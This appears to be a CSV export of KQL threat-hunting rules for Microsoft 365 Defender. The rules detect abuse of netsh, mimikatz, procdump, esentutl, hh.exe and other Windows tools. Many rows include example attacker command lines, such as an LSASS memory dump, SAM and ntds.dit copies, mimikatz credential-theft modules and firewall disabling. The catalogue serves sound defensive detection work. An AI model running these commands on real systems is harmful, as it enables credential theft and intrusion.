| where ProcessCommandLine contains ' i '
  and ProcessCommandLine contains ' p '
  and ProcessCommandLine contains ' a '
  and ProcessCommandLine contains ' v '"
179,netsh_pid_0005_mod_firewall_smb_enable,['enables print file share feature (smb) on windows by modifying firewall rules'],,2,kql,['lolbin'],t1562.004,s0108,,"['netsh advfirewall firewall set rule group=""file and printer sharing"" new enable=Yes']",windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName has 'netsh'
| where ProcessCommandLine has 'advfirewall'
  and ProcessCommandLine has 'set'
  and ProcessCommandLine has 'rule'
| where ProcessCommandLine contains 'group='
  and ProcessCommandLine contains 'file and printer sharing'
  and ProcessCommandLine contains 'enable='
  and ProcessCommandLine contains 'yes'"
180,netsh_pid_0002_disable_windows_firewall,['disable windows firewall'],,3,kql,['lolbin'],t1562.004,s0108,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName has 'netsh'
| where ProcessCommandLine has 'firewall'
  and ProcessCommandLine has 'set'
  and ProcessCommandLine has 'opmode'
| where ProcessCommandLine contains 'mode=disable'
  or ProcessCommandLine contains 'disable'"
181,netsh_pid_0001_set_firewall_profile_off,[None],,3,kql,['lolbin'],t1562.004,s0108,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName has 'netsh'
| where ProcessCommandLine has 'advfirewall'
  and ProcessCommandLine has 'set'
  and ProcessCommandLine has 'state'
  and ProcessCommandLine has 'off'
| where ProcessCommandLine contains 'allprofiles'
  or ProcessCommandLine contains 'Currentprofile' 
  or ProcessCommandLine contains 'Domainprofile'
  or ProcessCommandLine contains 'Privateprofile'
  or ProcessCommandLine contains 'Publciprofile'"
182,netsh_pid_0009_helper_dll,"['netsh used to register helper dll', 'persistence method']",,2,kql,['lolbin'],t546.007,s0108,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName has 'netsh'
| where ProcessCommandLine has 'add'
  and ProcessCommandLine has 'helper'"
183,netsh_pid_0010_port_forwarding,['netsh used to set up port forwarding'],,2,kql,['lolbin'],t1090,s0108,,['netsh I p a v l=8001 listena=127.0.0.1 connectp=80 c=192.168.1.1'],windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName has 'netsh'
| where ProcessCommandLine has 'listena'
  and ProcessCommandLine has 'connectp'
| where ProcessCommandLine contains 'c='
| where ProcessCommandLine contains ' i '
  and ProcessCommandLine contains ' p '
  and ProcessCommandLine contains ' a '
  and ProcessCommandLine contains ' v '"
184,netsh_pid_0008_show_fw_rules,['netsh used to list firewall rules'],,5,kql,['lolbin'],t1016,s0108,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName has 'netsh'
| where ProcessCommandLine has 'advfirewall'
  and ProcessCommandLine has 'firewall'
  and ProcessCommandLine has 'show'
  and ProcessCommandLine has 'rule'"
185,netsh_pid_0006_add_fw_rule,['add a local firewall rule name'],,5,kql,['lolbin'],t1562.004,s0108,,"['netsh.exe advfirewall firewall add rule ""name=allow RemoteDesktop"" dir=in * protocol=TCP localport=<port num> action=allow']",windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName has 'netsh'
| where ProcessCommandLine has 'advfirewall'
  and ProcessCommandLine has 'add'
  and ProcessCommandLine has 'rule'
| where ProcessCommandLine contains 'dir=in'
| where (ProcessCommandLine contains 'remote' 
        and ProcessCommandLine contains 'desktop' 
        and ProcessCommandLine contains 'name=')
    or (ProcessCommandLine contains 'localport=' and ProcessCommandLine contains '3389')"
186,mimikatz_pid_0008_vault,"['mimikatz command indicator', 'see command documentation for more descriptions']",,1,kql,,,s0002,,"[{'vault:': None}, 'vault::cred']",windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'vault'
| where ProcessCommandLine contains 'vault::'"
187,mimikatz_pid_0004_lsadump,"['mimikatz command indicator', 'refer to command documentation for further description']",,1,kql,,,s0002,,"[{'lsadump:': None}, 'lsadump::sam', 'lsadump::secrets', 'lsadump::trust', 'lsadump::zerologon', 'lsadump::dcsync']",windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'lsadump'
| where ProcessCommandLine contains 'lsadump::'"
188,mimikatz_pid_0005_privilege,"['mimikatz command indicator', 'This module provides some functionalities to manipulate privileges on mimikatz process']",,1,kql,,,s0002,,"[{'privilege:': None}, 'privilege::debug', 'privilege::security', 'privilege::name']",windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'privilege'
| where ProcessCommandLine contains 'privilege::'"
189,mimikatz_pid_0013_event,"['mimikatz command indicator', 'see command documentation for more descriptions']",,1,kql,,,s0002,,"[{'event:': None}, 'event::clear']",windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'event'
| where ProcessCommandLine contains 'event::'"
190,mimikatz_pid_0001_file_ioc,['mimikatz.exe file create or modified'],,1,kql,,,s0002,,['mimikatz'],windows_os,file_event,m365d_agent,m365d_security_center,,,m365d_security_center,device_file_events,,api_advanced_hunting,,,DeviceFileEvents,"| where FileName has 'mimikatz'
  or InitiatingProcessCommandLine has 'mimikatz'"
191,mimikatz_pid_0006_kerberos,"['mimikatz command indicator', 'can be used to forge tickets', 'see command documentation for more descriptions']",,1,kql,,t1558.001,s0002,,"[{'kerberos:': None}, 'kerberos::golden', 'kerberos::hash']",windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'kerberos'
| where ProcessCommandLine contains 'kerberos::'"
192,mimikatz_pid_0007_crypto,"['mimikatz command indicator', 'see command documentation for more descriptions']",,1,kql,,,s0002,,"[{'crypto:': None}, 'crypto::certificates', 'crypto::sc']",windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'crypto'
| where ProcessCommandLine contains 'crypto::'"
193,mimikatz_pid_0012_rpc,"['mimikatz command indicator', 'see command documentation for more descriptions']",,1,kql,,,s0002,,"[{'rpc:': None}, 'rpc::enum', 'rpc::server']",windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'rpc'
| where ProcessCommandLine contains 'rpc::'"
194,mimikatz_pid_0002_process_ioc,['mimikatz keyword identified in process creation'],,1,kql,,,s0002,,['mimikatz'],windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName has 'mimikatz'
  or ProcessVersionInfoOriginalFileName has 'mimikatz'
  or ProcessCommandLine has 'mimikatz'"
195,mimikatz_pid_0010_process,"['mimikatz command indicator', 'see command documentation for more descriptions']",,1,kql,,,s0002,,"[{'process:': None}, 'process::list']",windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'process'
| where ProcessCommandLine contains 'process::'"
196,mimikatz_pid_0011_misc,"['mimikatz command indicator', 'see command documentation for more descriptions']",,1,kql,,,s0002,,"[{'misc:': None}, 'misc::taskmgr', 'misc::shadowcopies']",windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'misc'
| where ProcessCommandLine contains 'misc::'"
197,mimikatz_pid_0003_sekurlsa,"['mimikatz command indicator', 'This modules is probably the most used one among Mimikatz users.', 'It retrieves clear text passwords, kerberos tickets, pin codes, etc', 'Creds from LSA Subsystem Service (LSASS)', 'Refer to command documention for further descriptions']",,1,kql,,t1003.001,s0002,,"[{'sekurlsa:': None}, 'sekurlsa::logonpasswords', 'sekurlsa::minidump']",windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'sekurlsa'
| where ProcessCommandLine contains 'sekurlsa::'"
198,mimikatz_pid_0009_dpapi,"['mimikatz command indicator', 'see command documentation for more descriptions']",,1,kql,,,s0002,,"[{'dpapi:': None}, 'dpapi::vault']",windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'dpapi'
| where ProcessCommandLine contains 'dpapi::'"
199,lsass_pid_0001_memory_read_not_system_acnt,['lsass read from a non system account'],,1,kql,['lol'],['t1003.001'],,"['https://threathunterplaybook.com/hunts/windows/170105-LSASSMemoryReadAccess/notebook.html', 'https://redcanary.com/threat-detection-report/techniques/lsass-memory/']",[None],windows_os,read_process_memory_api_call,m365d_agent,m365d_security_center,,,m365d_security_center,device_events,,api_advanced_hunting,,,DeviceEvents,"| where ActionType =~ 'ReadProcessMemoryApiCall'
  and FileName =~ 'lsass.exe'
  and AccountName !~ 'system'"
200,lsass_pid_0004_large_memory_read_taskmgr,['20 mb LSASS memory read from taskmgr'],,1,kql,['lol'],['t1003.001'],,"['https://threathunterplaybook.com/hunts/windows/170105-LSASSMemoryReadAccess/notebook.html', 'https://redcanary.com/threat-detection-report/techniques/lsass-memory/']",[None],windows_os,read_process_memory_api_call,m365d_agent,m365d_security_center,,,m365d_security_center,device_events,,api_advanced_hunting,,,DeviceEvents,"| where ActionType =~ 'ReadProcessMemoryApiCall'
  and FileName =~ 'lsass.exe'
  and InitiatingProcessFileName has 'taskmgr'
  and parse_json(AdditionalFields).TotalBytesCopied >= 20000000"
201,lsass_pid_0007_memdmp_rdrleakdiag,"['Powershell Get-Process LSASS', 'Dmp File Created']",,1,kql,['lol'],['t1003.001'],,"['https://threathunterplaybook.com/hunts/windows/170105-LSASSMemoryReadAccess/notebook.html', 'https://redcanary.com/threat-detection-report/techniques/lsass-memory/']","['for /f ""tokens=2 delims= "" %J in (\'""tasklist /fi ""Imagename eq lsass.exe"" | find ""lsass""""\') do rdrleakdiag.exe -p %J -enable & sleep 1 & rdrleakdiag.exe -p %J -o c:\\users\\maximus\\desktop\\dumps -fullmemdmp -snap']",windows_os,process_create,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'rdrleakdiag'
  and ProcessCommandLine has 'lsass'
| where ProcessCommandLine contains 'fullmemdmp'
  or ProcessCommandLine contains 'minidump'
"
202,lsass_pid_0002_large_rare_memory_read,"['20 mb LSASS memory read from a rare process on a single system', 'Last 24 hours < 1 devices show this activity']",,1,kql,['lol'],['t1003.001'],,"['https://threathunterplaybook.com/hunts/windows/170105-LSASSMemoryReadAccess/notebook.html', 'https://redcanary.com/threat-detection-report/techniques/lsass-memory/']",[None],windows_os,read_process_memory_api_call,m365d_agent,m365d_security_center,,,m365d_security_center,device_events,,api_advanced_hunting,,,DeviceEvents,"| where ActionType =~ 'ReadProcessMemoryApiCall'
  and FileName =~ 'lsass.exe'
  and parse_json(AdditionalFields).TotalBytesCopied >= 20000000
| summarize DeviceSet=make_set(DeviceName), arg_max(Timestamp, *) by InitiatingProcessFileName
| extend DeviceCount = array_length(DeviceSet)
| where DeviceCount <= 1"
203,lsass_pid_0005_dmp_file_created,"['LSASS.dmp File Created', 'Likely from Taskmgr']",,1,kql,['lol'],['t1003.001'],,"['https://threathunterplaybook.com/hunts/windows/170105-LSASSMemoryReadAccess/notebook.html', 'https://redcanary.com/threat-detection-report/techniques/lsass-memory/']",[None],windows_os,file_created,m365d_agent,m365d_security_center,,,m365d_security_center,device_file_events,,api_advanced_hunting,,,DeviceFileEvents,"| where ActionType =~ 'FileCreated'
  and FileName =~ 'lsass.dmp'"
204,lsass_pid_0003_large_memory_read_rundll,['20 mb LSASS memory read from rundll'],,1,kql,['lol'],['t1003.001'],,"['https://threathunterplaybook.com/hunts/windows/170105-LSASSMemoryReadAccess/notebook.html', 'https://redcanary.com/threat-detection-report/techniques/lsass-memory/']",[None],windows_os,read_process_memory_api_call,m365d_agent,m365d_security_center,,,m365d_security_center,device_events,,api_advanced_hunting,,,DeviceEvents,"| where ActionType =~ 'ReadProcessMemoryApiCall'
  and FileName =~ 'lsass.exe'
  and InitiatingProcessFileName contains 'rundll'
  and parse_json(AdditionalFields).TotalBytesCopied >= 20000000"
205,lsass_pid_0006_dmp_file_created_pshell_get_process,"['Powershell Get-Process LSASS', 'Dmp File Created']",,1,kql,['lol'],['t1003.001'],,"['https://threathunterplaybook.com/hunts/windows/170105-LSASSMemoryReadAccess/notebook.html', 'https://redcanary.com/threat-detection-report/techniques/lsass-memory/']",,windows_os,process_create,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName =~ 'powershell.exe'
  and ProcessCommandLine contains 'Get-Process'
  and ProcessCommandLine contains 'lsass'
"
206,hh_pid_0002_executing_chm,['open .CHM compiled HTML files with HH.exe HTML help'],,3,kql,['lolbin'],t1218.001,,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName =~ 'hh.exe'
| where ProcessCommandLine contains '.chm'"
207,hh_pid_0003_executing_remote_file,['HTML help executing remote file'],,3,kql,['lolbin'],t1218.001,,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName =~ 'hh.exe'
| where ProcessCommandLine contains 'http://'
  or ProcessCommandLine contains 'https://'"
208,hh_pid_0005_parent_powershell,['HTML help called by powershell'],,3,kql,['lolbin'],t1218.001,,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where InitiatingProcessVersionInfoOriginalFileName has 'powershell'
  and FileName =~ 'hh.exe'"
209,hh_pid_0004_decompiling_file,['HTML help decompiling file'],,3,kql,['lolbin'],t1218.001,,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName =~ 'hh.exe'
| where ProcessCommandLine contains '-decompile'"
210,hh_pid_0001_executing_ps1,['open powershell script with HTML help'],,3,kql,['lolbin'],t1218.001,,,['HH.exe http://some.url/script.ps1'],windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName =~ 'hh.exe'
| where ProcessCommandLine contains '.ps1'"
211,dumpert_pid_0001_direct_api_call,['Dump Creds from memory'],,1,kql,,t1003.001,,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'dumpert'
  or FileName has 'dumpert'"
212,mavinject_pid_0001_inject_dll,['MAVINJECT injecting arbitrary dll file'],,3,kql,['lolbin'],t1218.003,,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName has 'mavinject'
  and InitiatingProcessFileName !~ 'appvclient.exe'
| where ProcessCommandLine contains '/INJECTRUNNING'
  or InitiatingProcessCommandLine contains '/INJECTRUNNING'
| where ProcessCommandLine contains '.dll'"
213,keymgr_pid_0001_cred_dump,['rundll32 using key manager to dump creds'],,2,kql,['lolbin'],t1003,,,"['rundll32.exe keymgr,KRShowKeyMgr']",windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'keymgr' 
  and ProcessCommandLine has 'krshowkeymgr'
| where ProcessCommandLine contains 'rundll'"
214,appcmd_pid_0001_list_config,['List service account credentials from app pools on a server'],,1,kql,['lol'],['t1003'],,,,windows_os,process_create,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName =~ 'appcmd.exe'
  and ProcessCommandLine contains 'list'
  and ProcessCommandLine contains 'apppool'
| where ProcessCommandLine contains @'/config'
"
215,appcmd_pid_0001_list_svc_acnt_creds,['List service account credentials from app pools on a server'],,1,kql,['lol'],['t1003'],,,,windows_os,process_create,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName =~ 'appcmd.exe'
  and ProcessCommandLine contains 'list'
  and ProcessCommandLine contains 'apppool'
| where ProcessCommandLine contains @'/@t:*'
  and ProcessCommandLine contains @'/@text:*'
  and ProcessCommandLine contains @'/text:*'
"
216,infdefualtinstall_pid_0001_executing_inf,['infdefaultinstall used to execute .inf file'],,3,kql,['lolbin'],t1218,,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName has 'InfDefaultInstall'
| where ProcessCommandLine contains '.inf'"
217,procdump_pid_0003_fulldump_flag,['procdump creating fulldump of a process'],,3,kql,['sysinternals'],t1003,,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'procdump'
  or FileName has 'procdump'
  or FileName has 'procdump64'
| where ProcessCommandLine has 'accepteula'
  and ProcessCommandLine contains '-ma'"
218,procdump_pid_0005_dump_flag,['procdump creating fulldump of lsass process'],,3,kql,['sysinternals'],t1003.001,,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'procdump'
  or FileName has 'procdump'
  or FileName has 'procdump64'
| where ProcessCommandLine has 'accepteula'
| where ProcessCommandLine contains '-ma'
  or ProcessCommandLine contains '-mm'
  or ProcessCommandLine contains '-mt'
  or ProcessCommandLine contains '-mp'
  or ProcessCommandLine contains '-mc'
  or ProcessCommandLine contains '-md'
  or ProcessCommandLine contains '-mk'"
219,procdump_pid_0001_minidump_flag,['procdump creating minidump of a process'],,3,kql,['sysinternals'],t1003,,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'procdump'
  or FileName has 'procdump'
  or FileName has 'procdump64'
| where ProcessCommandLine has 'accepteula'
  and ProcessCommandLine contains '-mm'"
220,procdump_pid_0002_minidump_lsass,['procdump creating minidump of lsass'],,1,kql,['sysinternals'],t1003.001,,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'procdump'
  or FileName has 'procdump'
  or FileName has 'procdump64'
| where ProcessCommandLine has 'accepteula'
  and ProcessCommandLine contains '-mm'
  and ProcessCommandLine contains 'lsass'"
221,procdump_pid_0004_fulldump_lsass,['procdump creating fulldump of lsass process'],,1,kql,['sysinternals'],t1003.001,,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'procdump'
  or FileName has 'procdump'
  or FileName has 'procdump64'
| where ProcessCommandLine has 'accepteula'
  and ProcessCommandLine contains '-ma'
  and ProcessCommandLine contains 'lsass'"
222,procdump_pid_0006_renamed,['procdump renamed'],,3,kql,['sysinternals'],t1036,,,,windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessVersionInfoOriginalFileName has 'procdump'
| where FileName !has 'procdump'
  and FileName !contains 'procdump64'"
223,control_pid_0002_executing_dll_file,['abusing control.exe to execute dll file'],,5,kql,['lolbin'],t1218.002,,,['control.exe somefolder\\somefile.dll'],windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName has 'control'
  and ProcessCommandLine has 'control'
| where ProcessCommandLine contains '.dll'"
224,control_pid_0002_executing_dll_file,['abusing control.exe to execute dll file'],,5,kql,['lolbin'],t1218.002,,,[None],windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where InitiatingProcessFileName has 'control'
  and FileName startswith 'rundll'
| where ProcessCommandLine contains 'shell32.dll'
  and ProcessCommandLine contains 'Control_Rundll'"
225,control_pid_0001_executing_cpl_file,['abusing control.exe to execute cpl file'],,5,kql,['lolbin'],t1218.002,,,['control.exe somefolder\\somefile.cpl'],windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName has 'control'
  and ProcessCommandLine has 'control'
| where ProcessCommandLine contains '.cpl'"
226,esentutl_pid_0003_create_vss,['esentutl creating volume shadow copy'],,1,kql,['lolbin'],t1003.003,,"['atomic_red_team_t1003_003_t6_guid_21c7bf80-3e8b-40fa-8f9d-f5b194ff2865', 'atomic_red_team_t1003_002_t3_guid_a90c2f4d-6726-444e-99d2-a00cd7c20480']","['wmic /node:localhost process call create ""cmd.exe /c esentutl.exe /y /vss c:\\windows\\ntds\\ntds.dit /d c:\\ntds.dit']",windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'esentutl'
| where ProcessCommandLine contains '/y'
| where ProcessCommandLine contains '/vss'
  or ProcessCommandLine contains 'vssrec'"
227,esentutl_pid_0002_copy_ntds,['Copy the SAM hive using the esentutl.exe utility and Volume Shadow Copy (vss)'],,1,kql,['lolbin'],t1003.003,,,"['wmic /node:{target_host} process call create ""cmd.exe /c esentutl.exe /y /vss {source_path} /d {target_path}']",windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'esentutl'
| where ProcessCommandLine contains 'ntds.dit'"
228,esentutl_pid_0001_copy_sam,['Copy the SAM hive using the esentutl.exe utility'],,1,kql,['lolbin'],t1003.002,,,['esentutl.exe /y /vss %SystemRoot%/system32/config/SAM /d %temp%/SAM'],windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where ProcessCommandLine has 'esentutl'
| where ProcessCommandLine contains 'sam'"
229,esentutl_pid_0004_webcach browser dump,['Collection of browser data from Internet Explorer and Microsoft Edge was also observed with Qbot using the built-in utility esentutl.exe.'],,1,kql,['lolbin'],,,,"['esentutl.exe /r V01 /l""C:\\Users\\REDACTED\\AppData\\Local\\Microsoft\\Windows\\WebCache"" /s""C:\\Users\\REDACTED\\AppData\\Local\\Microsoft\\Windows\\WebCache"" /d""C:\\Users\\REDACTED\\AppData\\Local\\Microsoft\\Windows\\WebCache""', 'esentutl.exe /r V01 /l""C:\\Users\\<redacted>\\AppData\\Local\\Microsoft\\Windows\\WebCache"" /s""C:\\Users\\<redacted>\\AppData\\Local\\Microsoft\\Windows\\WebCache"" /d""C:\\Users\\<redacted>\\AppData\\Local\\Microsoft\\Windows\\WebCache""']",windows_os,process_creation,m365d_agent,m365d_security_center,,,m365d_security_center,device_process_events,,api_advanced_hunting,,,DeviceProcessEvents,"| where FileName has 'esentutl'
  and  ProcessCommandLine contains @'\Windows\WebCache'"
